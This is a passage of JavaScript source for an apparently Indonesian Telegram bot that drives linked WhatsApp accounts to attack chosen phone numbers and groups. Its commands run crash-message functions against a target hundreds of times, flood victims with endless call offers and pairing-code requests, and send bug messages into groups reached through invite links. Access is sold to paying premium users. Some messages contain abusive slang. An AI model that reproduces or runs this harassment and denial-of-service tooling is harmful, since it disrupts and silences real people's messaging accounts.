  }
});

bot.onText(/\/Xtite(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";
    const randomImage = getRandomImage();

    // 1. Cek Akses Premium
      if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, { // Pastikan chatId (tanpa underscore)
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM\n\nUser : ${username}\nStatus : Premium Required\n\nHubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/RidzzOffc" }]
          ]
        }
      }); // Tutup kurung ini sangat penting
    }


    // 2. Validasi Input Target
    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Xtite 628xxxx");
    }

    const targetNumber = match[1];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const date = getCurrentDate(); // Mengikuti gaya ForceInvinity

    // 3. Cek Cooldown
    const cooldown = checkCooldown(senderId);
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`);
    }

    // 4. Cek Ketersediaan Session WhatsApp
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu"
      );
    }

    // 5. Kirim Notifikasi Awal (Success Layout)
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/eg5zg4.jpg",
      {
        caption: `<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xtite
▹ Status : Processed
▹ Date : ${date}
</blockquote>
<i>Note: Jeda 20 menit agar sender tidak overheat</i>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    // 6. Eksekusi Loop Bug di Background
    setTimeout(async () => {
      try {
        console.log("\x1b[32m[PROCESS MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        
        for (let i = 0; i < 400; i++) {
          await JammerMutated(target);
          await JammerZombieX(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          
          // Gunakan fungsi sleep jika tersedia, atau Promise
          await new Promise((resolve) => setTimeout(resolve, 1000));
          
          if (i % 50 === 0) { // Log setiap 50 loop agar tidak spam console
             console.log(`[RidzzOffc] Xtite: ${formattedNumber} (${i}/400)`);
          }
        }
        
        console.log(`\x1b[32m[SUCCESS]\x1b[0m Bug Xtite selesai dikirim ke ${formattedNumber}`);

        // Update caption setelah selesai (opsional)
        await bot.editMessageCaption(`<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xtite
▹ Status : Success
▹ Date : ${date}
</blockquote>`, {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]
            ]
          }
        });

      } catch (err) {
        console.log("Xtite Loop Error:", err);
      }
    }, 100);

  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    console.log("Xtite ERROR:", error);
  }
});

//------------------------------------------------------------------------------------------------------------------------------\\
function extractGroupID(link) {
  try {
    if (link.includes("chat.whatsapp.com/")) {
      return link.split("chat.whatsapp.com/")[1];
    }
    return null;
  } catch {
    return null;
  }
}

bot.onText(/\/blankgroup(?:\s(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(senderId);

  const args = msg.text.split(" ");
  const groupLink = args[1] ? args[1].trim() : null;

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`js
LU SIAPA? NGENTOT\`\`\`
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝙍𝙄𝘿𝙕𝙕",
              url: "https://t.me/RidzzOffc",
            },
          ],
        ],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (!groupLink) {
      return await bot.sendMessage(chatId, `Example: /blankgroup <link>`);
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    async function joinAndSendBug(groupLink) {
      try {
        const groupCode = extractGroupID(groupLink);
        if (!groupCode) {
          await bot.sendMessage(chatId, "Link grup tidak valid");
          return false;
        }

        try {
          const groupId = await sock.groupGetInviteInfo(groupCode);

          for (let i = 0; i < 10; i++) {
            await VampireBugIns(groupId.id);
          }
        } catch (error) {
          console.error(`Error dengan bot`, error);
        }
        return true;
      } catch (error) {
        console.error("Error dalam joinAndSendBug:", error);
        return false;
      }
    }

    const success = await joinAndSendBug(groupLink);

    if (success) {
      await bot.sendPhoto(chatId, "https://files.catbox.moe/eg5zg4.jpg", {
        caption: `
\`\`\`
#SUCCES BUG❗
- status : Success
- Link : ${groupLink}
\`\`\`
`,
        parse_mode: "Markdown",
      });
    } else {
      await bot.sendMessage(chatId, "Gagal Mengirim Bug");
    }
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});


bot.onText(/^\/brat(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = match[1];
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }
  
  if (!argsRaw) {
    return bot.sendMessage(chatId, 'Gunakan: /brat <teks> [--gif] [--delay=500]');
  }

  try {
    const args = argsRaw.split(' ');

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(arg);
      }
    }

    const text = textParts.join(' ');
    if (!text) {
      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
    }

    // Validasi delay
    if (isAnimated && (delay < 100 || delay > 1500)) {
      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
    }

    await bot.sendMessage(chatId, '🌿 Generating stiker brat...');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
    });

    const buffer = Buffer.from(response.data);

    // Kirim sticker (bot API auto-detects WebP/GIF)
    await bot.sendSticker(chatId, buffer);
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});
bot.onText(/\/tourl/i, async (msg) => {
    const chatId = msg.chat.id;
    
    
    if (!msg.reply_to_message || (!msg.reply_to_message.document && !msg.reply_to_message.photo && !msg.reply_to_message.video)) {
        return bot.sendMessage(chatId, "❌ Silakan reply sebuah file/foto/video dengan command /tourl");
    }

    const repliedMsg = msg.reply_to_message;
    let fileId, fileName;

    
    if (repliedMsg.document) {
        fileId = repliedMsg.document.file_id;
        fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
    } else if (repliedMsg.photo) {
        fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
        fileName = `photo_${Date.now()}.jpg`;
    } else if (repliedMsg.video) {
        fileId = repliedMsg.video.file_id;
        fileName = `video_${Date.now()}.mp4`;
    }

    try {
        
        const processingMsg = await bot.sendMessage(chatId, "⏳ Mengupload ke Catbox...");

        
        const fileLink = await bot.getFileLink(fileId);
        const response = await axios.get(fileLink, { responseType: 'stream' });

        
        const form = new FormData();
        form.append('reqtype', 'fileupload');
        form.append('fileToUpload', response.data, {
            filename: fileName,
            contentType: response.headers['content-type']
        });

        const { data: catboxUrl } = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: form.getHeaders()
        });

        
        await bot.editMessageText(` Upload berhasil!\n📎 URL: ${catboxUrl}`, {
            chat_id: chatId,
            message_id: processingMsg.message_id
        });

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox");
    }
});

bot.onText(/\/SpamPairing (\d+)\s*(\d+)?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
    );
  }

  const target = match[1];
  const count = parseInt(match[2]) || 999999;

  bot.sendMessage(
    chatId,
    `Mengirim Spam Pairing ${count} ke nomor ${target}...`
  );

  try {
    const { state } = await useMultiFileAuthState("senzypairing");
    const { version } = await fetchLatestBaileysVersion();

    const sucked = await makeWASocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: pino({ level: "fatal" }),
      browser: ["Mac Os", "chrome", "121.0.6167.159"],
    });

    for (let i = 0; i < count; i++) {
      await sleep(1600);
      try {
        await sucked.requestPairingCode(target);
      } catch (e) {
        console.error(`Gagal spam pairing ke ${target}:`, e);
      }
    }

    bot.sendMessage(chatId, `Selesai spam pairing ke ${target}.`);
  } catch (err) {
    console.error("Error:", err);
    bot.sendMessage(chatId, "Terjadi error saat menjalankan spam pairing.");
  }
});

bot.onText(/\/SpamCall(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  // Check if the command is used in the allowed group

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }
    
if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "🚫 Missing input. Please provide a target number. Example: /overload 62×××."
    );
  }

  const numberTarget = match[1].replace(/[^0-9]/g, "").replace(/^\+/, "");
  if (!/^\d+$/.test(numberTarget)) {
    return bot.sendMessage(
      chatId,
      "🚫 Invalid input. Example: /overload 62×××."
    );
  }

  const formatedNumber = numberTarget + "@s.whatsapp.net";

  await bot.sendPhoto(chatId, "https://files.catbox.moe/eg5zg4.jpg", {
    caption: `┏━━━━━━〣 𝙽𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 〣━━━━━━┓
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /spamcall
┃〢 Wᴀʀɴɪɴɢ : ᴜɴʟɪᴍɪᴛᴇᴅ ᴄᴀʟʟ
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`,
  });

  for (let i = 0; i < 9999999; i++) {
    await sendOfferCall(formatedNumber);
    await sendOfferVideoCall(formatedNumber);
    await new Promise((r) => setTimeout(r, 1000));
  }
});


bot.onText(/^\/hapusbug\s+(.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const q = match[1]; // Ambil argumen setelah /delete-bug
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\n/hapusbug 62xxx`);
    }
    
    let pepec = q.replace(/[^0-9]/g, "");
    if (pepec.startsWith('0')) {
        return bot.sendMessage(chatId, `Contoh : /hapusbug 62xxx`);
    }
    
    let target = pepec + '@s.whatsapp.net';
    
    try {
        for (let i = 0; i < 3; i++) {
            await sock.sendMessage(target, { 
                text: "𝙍𝙄𝘿𝙕𝙕 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝙍𝙄𝘿𝙕𝙕 𝐆𝐀𝐍𝐓𝐄𝐍𝐆"
            });
        }
        bot.sendMessage(chatId, "Done Clear Bug By Fadzx😜");l
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
    }
});

bot.onText(/\/SpamReportWhatsapp (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (!isOwner(fromId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
    );
  }

  const q = match[1];
  if (!q) {
    return bot.sendMessage(
      chatId,
      "❌ Mohon masukkan nomor yang ingin di-*report*.\nContoh: /spamreport 628xxxxxx"
    );
  }

  const target = q.replace(/[^0-9]/g, "").trim();
  const pepec = `${target}@s.whatsapp.net`;

  try {
    const { state } = await useMultiFileAuthState("senzyreport");
    const { version } = await fetchLatestBaileysVersion();

    const sucked = await makeWASocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: pino({ level: "fatal" }),
      browser: ["Mac OS", "Chrome", "121.0.6167.159"],
    });

    await bot.sendMessage(chatId, `Telah Mereport Target ${pepec}`);

    while (true) {
      await sleep(1500);
      await sucked.requestPairingCode(target);
    }
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `done spam report ke nomor ${pepec} ,,tidak work all nomor ya!!`);
  }
});

//=======case owner=======//
bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 123456789.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 123456789.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});


bot.onText(/\/addowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const newOwnerId = match[1].trim();

  try {
    const configPath = "./config.js";
    const configContent = fs.readFileSync(configPath, "utf8");

    if (config.OWNER_ID.includes(newOwnerId)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`
╭─────────────────
│    GAGAL MENAMBAHKAN    
│────────────────
│ User ${newOwnerId} sudah
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID.push(newOwnerId);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    BERHASIL MENAMBAHKAN    
│────────────────
│ ID: ${newOwnerId}
│ Status: Owner Bot
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error adding owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menambahkan owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/delowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const ownerIdToRemove = match[1].trim();

  try {
    const configPath = "./config.js";

    if (!config.OWNER_ID.includes(ownerIdToRemove)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`
╭─────────────────
│    GAGAL MENGHAPUS    
│────────────────
│ User ${ownerIdToRemove} tidak
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID = config.OWNER_ID.filter((id) => id !== ownerIdToRemove);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    BERHASIL MENGHAPUS    
│────────────────
│ ID: ${ownerIdToRemove}
│ Status: User Biasa
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error removing owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menghapus owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender"
      );
    }

    let botList = 
  "```" + "\n" +
  "╭━━━⭓「 𝐋𝐢𝐒𝐓 ☇ °𝐁𝐎𝐓 」\n" +
  "║\n" +
  "┃\n";

let index = 1;

for (const [botNumber, sock] of sessions.entries()) {
  const status = sock.user ? "🟢" : "🔴";
  botList += `║ ◇ 𝐁𝐎𝐓 ${index} : ${botNumber}\n`;
  botList += `┃ ◇ 𝐒𝐓𝐀𝐓𝐔𝐒 : ${status}\n`;
  botList += "║\n";
  index++;
}
botList += `┃ ◇ 𝐓𝐎𝐓𝐀𝐋𝐒 : ${sessions.size}\n`;
botList += "╰━━━━━━━━━━━━━━━━━━⭓\n";
botList += "```";


    await bot.sendMessage(chatId, botList, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error in listbot:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengambil daftar bot. Silakan coba lagi."
    );
  }
});

bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error(`bot ${botNum}:`, error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

const moment = require("moment");

bot.onText(/\/setcd (\d+[smh])/, (msg, match) => {
  const chatId = msg.chat.id;
  const response = setCooldown(match[1]);

  bot.sendMessage(chatId, response);
});

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d."
    );
  }

  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d."
    );
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d."
    );
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d."
    );
  }

  const now = moment();
  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d"
      ? "days"
      : duration.slice(-1) === "h"
      ? "hours"
      : "minutes"
  );

  if (!premiumUsers.find((user) => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(
      `${senderId} added ${userId} to premium until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}`
    );
    bot.sendMessage(
      chatId,
      `✅ User ${userId} has been added to the premium list until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  } else {
    const existingUser = premiumUsers.find((user) => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
    savePremiumUsers();
    bot.sendMessage(
      chatId,
      `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});


bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - P R E M \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format("YYYY-MM-DD HH:mm:ss");
    message += `${index + 1}. ID: \`${
      user.id
    }\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/cekidch (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const link = match[1];

  let result = await getWhatsAppChannelInfo(link);

  if (result.error) {
    bot.sendMessage(chatId, `⚠️ ${result.error}`);
  } else {
    let teks = `
📢 *Informasi Channel WhatsApp*
🔹 *ID:* ${result.id}
🔹 *Nama:* ${result.name}
🔹 *Total Pengikut:* ${result.subscribers}
🔹 *Status:* ${result.status}
🔹 *Verified:* ${result.verified}
        `;
    bot.sendMessage(chatId, teks);
  }
});

bot.onText(/\/delbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  let statusMessage = await bot.sendMessage(
    chatId,
`
\`\`\`
╭─────────────────
│    𝙼𝙴𝙽𝙶𝙷𝙰𝙿𝚄𝚂 𝙱𝙾𝚃    
│────────────────
│ Bot: ${botNumber}
│ Status: Memproses...
╰─────────────────\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  try {
    const sock = sessions.get(botNumber);
    if (sock) {
      sock.logout();
      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      if (fs.existsSync(SESSIONS_FILE)) {
        const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        const updatedNumbers = activeNumbers.filter((num) => num !== botNumber);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
      }

      await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    } else {
      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });

        if (fs.existsSync(SESSIONS_FILE)) {
          const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
          const updatedNumbers = activeNumbers.filter(
            (num) => num !== botNumber
          );
          fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
        }

        await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      } else {
        await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁    
│────────────────
│ Bot: ${botNumber}
│ Status: Bot tidak ditemukan!
╰─────────────────\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      }
